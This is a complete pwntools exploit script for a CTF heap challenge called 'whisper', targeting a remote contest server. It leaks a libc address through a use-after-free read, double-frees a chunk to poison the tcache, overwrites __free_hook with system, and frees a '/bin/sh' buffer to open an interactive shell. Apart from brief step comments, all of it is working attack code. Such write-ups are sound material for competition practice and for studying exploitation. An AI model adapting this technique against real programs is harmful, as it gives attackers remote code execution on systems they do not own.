#!/usr/bin/env python3
from pwn import *
import os

if args.LOCAL:
    elf = ELF('./whisper_patched', checksec=False)
else:
    elf = ELF('./whisper',checksec=False)

context.binary = elf
libc = ELF('./libc.so.6', checksec=False)

def conn():
    if args.LOCAL:
        r = process(elf.path)
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote('offsec.m0lecon.it',13582)
    return r

def create(idx,size,data=b'A'*0x10):
    p.sendlineafter(b'> ',b'1')
    p.sendlineafter(b'index: ', str(idx).encode())
    p.sendlineafter(b'size: ', str(size).encode())
    p.sendafter(b'data: ',data.ljust(size,b'\x00'))

def delete(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'index: ', str(idx).encode())

def edit(idx,data):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'index: ', str(idx).encode())
    p.sendafter(b'data: ', data)

def show(idx):
    p.sendlineafter(b'> ',b'4')
    p.sendlineafter(b'index: ',str(idx).encode())
    r = p.recvline()
    p.recvline()
    return r

p = conn()
malloc_hook = 0x1ecb70                  #with readelf -sW ...
free_hook = 0x1eee48                    

def main():
    #create two chunks big enough for the unsorted bin: size > 0x408 to avoid tcache
    create(0,0x420)
    create(1,0x20)

    delete(0)                           #now the chunk is in the unsorted bin
    r = show(0).strip()
    fd = u64(r[:8])                     # bk e ld should point to main_arena + 0x60
    bk = u64(r[8:16])
    log.info(f'fd/bk value: {fd:#x}')
    libc.address = fd - 0x70 - malloc_hook
    log.success(f'libc base address found: {libc.address:#x}')

    #use the __free_hook to invoke system('/bin/sh')
    delete(1)
    edit(1,b'\x00'*16)
    delete(1)
    edit(1,p64(libc.address + free_hook))

    create(1,0x20,b'/bin/sh\x00')
    create(2,0x20)                      #this one should point to __free_hook
    edit(2,p64(libc.sym['system']))     #overwrite __free_hook with system: free('/bin/sh') -> system('/bin/sh')
    delete(1)

    p.interactive()

if __name__ == "__main__":
    main()